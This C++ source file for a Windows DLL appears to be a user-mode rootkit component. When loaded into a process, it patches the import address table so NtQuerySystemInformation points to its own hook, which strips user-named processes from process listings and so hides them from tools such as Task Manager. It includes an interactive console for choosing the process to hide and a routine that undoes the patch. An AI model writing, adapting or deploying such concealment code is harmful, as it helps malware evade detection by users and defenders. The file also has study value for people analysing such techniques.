// dllmain.cpp : Defines the entry point for the DLL application.
#include "pch.h"
#include <iostream>
#include <psapi.h>
#include <winnt.h>
#include <winternl.h>
#include <TlHelp32.h>
#include <Windows.h>
#include <string.h>

#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)

std::string procName;

typedef NTSTATUS(WINAPI* PNT_QUERY_SYSTEM_INFORMATION)(
    __in SYSTEM_INFORMATION_CLASS SystemInformationClass,
    __inout PVOID SystemInformation,
    __in ULONG SystemInformationLength,
    __out_opt PULONG ReturnLength
    );

PNT_QUERY_SYSTEM_INFORMATION origNtQuerySysInfo = (PNT_QUERY_SYSTEM_INFORMATION)GetProcAddress(GetModuleHandle("ntdll"), "NtQuerySystemInformation");

NTSTATUS WINAPI hookNtQuerySysInfo(
    __in SYSTEM_INFORMATION_CLASS SystemInformationClass,
    __inout PVOID SystemInformation,
    __in ULONG SystemInformationLength,
    __out_opt PULONG ReturnLength
) {
    NTSTATUS status = origNtQuerySysInfo(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);

    if (SystemProcessInformation == SystemInformationClass && STATUS_SUCCESS == status)
    {
        SYSTEM_PROCESS_INFORMATION* pCurrent = (SYSTEM_PROCESS_INFORMATION*) SystemInformation;

        while (pCurrent->NextEntryOffset != 0) {
            SYSTEM_PROCESS_INFORMATION* pNext = (SYSTEM_PROCESS_INFORMATION*)((PUCHAR)pCurrent + pCurrent->NextEntryOffset);

            if (wcsncmp(pNext->ImageName.Buffer, std::wstring(procName.begin(), procName.end()).c_str(), pNext->ImageName.Length) == 0) {
                pCurrent->NextEntryOffset += pNext->NextEntryOffset;
            }
            else {
                pCurrent = pNext;
            }
        }
    }
    return status;
}

DWORD WINAPI main(HMODULE hModule) {
    AllocConsole();
    FILE* f;
    FILE* f2;
    freopen_s(&f, "CONOUT$", "w", stdout);
    freopen_s(&f2, "CONIN$", "r", stdin);

    MODULEINFO modInfo;
    GetModuleInformation(GetCurrentProcess(), GetModuleHandle(0), &modInfo, sizeof(MODULEINFO));

    std::cout << "Base address: " << modInfo.lpBaseOfDll << std::endl;
    
    IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)modInfo.lpBaseOfDll;
    IMAGE_NT_HEADERS* ntHeader = (IMAGE_NT_HEADERS*)((BYTE*)modInfo.lpBaseOfDll + dosHeader->e_lfanew);
    IMAGE_OPTIONAL_HEADER optionalHeader = (IMAGE_OPTIONAL_HEADER)(ntHeader->OptionalHeader);
    IMAGE_IMPORT_DESCRIPTOR* importDescriptor = (IMAGE_IMPORT_DESCRIPTOR*)((BYTE*)(modInfo.lpBaseOfDll) + optionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);

    while (importDescriptor->Characteristics) {
        if (strcmp("ntdll.dll", (char*)((BYTE*)modInfo.lpBaseOfDll + importDescriptor->Name)) == 0) {
            std::cout << "ntdll.dll IAT found at " << importDescriptor->FirstThunk << std::endl;
            break;
        }
        importDescriptor++;
    }

    IMAGE_THUNK_DATA* tableEntry = (IMAGE_THUNK_DATA*)((BYTE*)modInfo.lpBaseOfDll + importDescriptor->OriginalFirstThunk);
    IMAGE_THUNK_DATA* IATEntry = (IMAGE_THUNK_DATA*)((BYTE*)modInfo.lpBaseOfDll + importDescriptor->FirstThunk);
    IMAGE_IMPORT_BY_NAME* funcName;
    
    while (!(tableEntry->u1.Ordinal & IMAGE_ORDINAL_FLAG) && tableEntry->u1.AddressOfData) {
        funcName = (IMAGE_IMPORT_BY_NAME*)((BYTE*)modInfo.lpBaseOfDll + tableEntry->u1.AddressOfData);
        if (strcmp("NtQuerySystemInformation", (char*)(funcName->Name)) == 0) {
            std::cout << "NtQuerySystemInformation found at: " << IATEntry->u1.Function << std::endl;
            break;
        }
        tableEntry++;
        IATEntry++;
    }

    DWORD oldProt;
    VirtualProtect(&(IATEntry->u1.Function), sizeof(uintptr_t), PAGE_READWRITE, &oldProt);
    IATEntry->u1.Function = (uintptr_t)hookNtQuerySysInfo;
    VirtualProtect(&(IATEntry->u1.Function), sizeof(uintptr_t), oldProt, &oldProt);

    std::cout << "NtQuerySystemInformation hooked. New function at: " << hookNtQuerySysInfo << std::endl;

    while (true) {
        std::string tmp;
        std::cout << "Name of process to hide: ";
        std::cin >> tmp;
        
        if (tmp == "q") {
            DWORD oldProt;
            VirtualProtect(&(IATEntry->u1.Function), sizeof(uintptr_t), PAGE_READWRITE, &oldProt);
            IATEntry->u1.Function = (uintptr_t)origNtQuerySysInfo;
            VirtualProtect(&(IATEntry->u1.Function), sizeof(uintptr_t), oldProt, &oldProt);

            fclose(f);
            fclose(f2);
            FreeConsole();
            FreeLibraryAndExitThread(hModule, 0);
            return 0;
        }
        else {
            procName = tmp;
        }
    }
    
}

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        CloseHandle(CreateThread(nullptr, 0, (LPTHREAD_START_ROUTINE)main, hModule, 0, nullptr));
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

